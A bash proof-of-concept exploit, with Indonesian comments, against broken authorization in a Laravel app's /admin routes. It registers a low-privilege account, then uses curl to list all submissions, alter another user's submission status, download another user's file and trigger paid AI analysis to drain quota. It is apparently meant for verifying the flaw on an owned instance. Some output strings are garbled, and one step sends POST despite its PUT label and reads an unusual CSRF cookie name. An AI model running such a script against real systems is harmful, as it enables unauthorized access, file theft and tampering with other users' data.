#!/usr/bin/env bash
# ============================================================
# POC — Broken Authorization (BFLA + IDOR) pada /admin/*
# Target : laravel-reza
# Penggunaan : jalankan saat aplikasi berjalan lokal (php artisan serve)
# Setup base URL aplikasi dibawah.
#
# EKSPLOIT UNTUK DIJALANKAN HANYA PADA INSTANCE YANG LO PUNYA/IZIN.
# ============================================================
set -euo pipefail

# --- Konfigurasi ---
BASE="${1:-http://127.0.0.1:8000}"   # base URL aplikasi
TARGET_TUGAS_ID="${2:-1}"            # id tugas korban (pakai id orang lain)
COOKIE="$(mktemp)"

echo "[*] Target : $BASE"
echo "[*] Mengambil cookie & CSRF dari halaman register..."

# --- Langkah 0: Dapatkan CSRF token ---
REG_HTML="$(mktemp)"
curl -s -c "$COOKIE" "$BASE/register" -o "$REG_HTML"
CSRF=$(grep -oP 'name="_token" value="\K[^"]+' "$REG_HTML" | head -1)
[[ -z "$CSRF" ]] && { echo "[!] Gagal ambil CSRF token"; exit 1; }
echo "[*] CSRF token didapat : ${CSRF:0:20}..."

# --- Langkah 1: Daftar akun peserta (role default = 'peserta') ---
ATTACKER_MAIL="poc_attacker_$(date +%s)@test.com"
echo "[*] Registrasi akun peserta : $ATTACKER_MAIL"
curl -s -b "$COOKIE" -c "$COOKIE" "$BASE/register" \
  -d "_token=$CSRF&name=pocattacker&email=$ATTACKER_MAIL&password=Password123!&password_confirmation=Password123!" \
  -o /dev/null -w "[+] Registrasi HTTP %{http_code}\n"

echo ""
echo "[*] ======================================================"
echo "[*] CGI PENYEK BUKTI — user PESERTA akses rute ADMIN"
echo "[*] ======================================================"

# --- Langkah 2: Enumeration — GET /admin/tugas (harusnya 403 utk peserta) ---
echo ""
echo "[1/5] GET /admin/tugas  (list semua submission)"
HTTP=$(curl -s -b "$COOKIE" -o /tmp/poc_admin_tugas.html -w "%{http_code}" "$BASE/admin/tugas")
LEAK=$(grep -c "Data Tugas Peserta" /tmp/poc_admin_tugas.html || true)
echo "      HTTP $HTTP"
if [ "$HTTP" = "200" ]; then
  echo "      * RESPONSE 200 — SUBMISSION TERBUKTI KEKSONGAN ke peserta!"
  echo "      * Data yang terekspos: nama user, judul, status, file, AI review"
elif [ "$HTTP" = "403" ]; then
  echo "      HTTP 403 — sudah aman (patch AdminMiddleware bekerja)."
fi

# --- Langkah 3: Ganti status punya orang lain ---
echo ""
echo "[2/5] PUT /admin/tugas/$TARGET_TUGAS_ID/status (ganti status org lain)"
echo "      body: status=Revisi&komentar=Pwned"
# ambil CSRF dari cookie session (biasanya). fallback token.
TOK=$(grep csrftoken "$COOKIE" 2>/dev/null | awk '{print $NF}' | tail -1)
HTTP=$(curl -s -b "$COOKIE" -X POST "$BASE/admin/tugas/$TARGET_TUGAS_ID/status" \
  -H "X-CSRF-TOKEN: $TOK" \
  -d "_token=$TOK&status=Revisi&komentar=Pwned" \
  -o /dev/null -w "%{http_code}" || true)
echo "      HTTP ${HTTP:-?}  (302/redirect = berhasil mutate, 403 = aman)"

# --- Langkah 4: Download file orang lain ---
echo ""
echo "[3/5] GET /admin/tugas/$TARGET_TUGAS_ID/download (curi file org lain)"
HTTP=$(curl -s -b "$COOKIE" -o /tmp/poc_stolen.pdf -w "%{http_code}" "$BASE/admin/tugas/$TARGET_TUGAS_ID/download")
SIZE=$(stat -c%s /tmp/poc_stolen.pdf 2>/dev/null || echo 0)
echo "      HTTP $HTTP — file tersimpan di /tmp/poc_stolen.pdf (${SIZE} bytes)"
[ "$HTTP" = "200" ] && [ "$SIZE" -gt 0 ] && echo "      * FILE ORANG LAIN BERHASIL DICURI!"

# --- Langkah 5: Trigger AI analysis pada file org lain (boros quota Groq) ---
echo ""
echo "[4/5] GET /admin/tugas/$TARGET_TUGAS_ID/analisis-ai (boros biaya quora Groq)"
HTTP=$(curl -s -b "$COOKIE" -L -o /tmp/poc_ai.html -w "%{http_code}" "$BASE/admin/tugas/$TARGET_TUGAS_ID/analisis-ai")
echo "      HTTP $HTTP"

echo ""
echo "[5/5] Ringkasan"
echo "      Jika langkah [1/5]-[4/5] balas 200/302/redirect -> app RENTAN (terbukti)."
echo "      Jika [1/5] 403 -> patched, aman."
rm -f "$REG_HTML" "$COOKIE"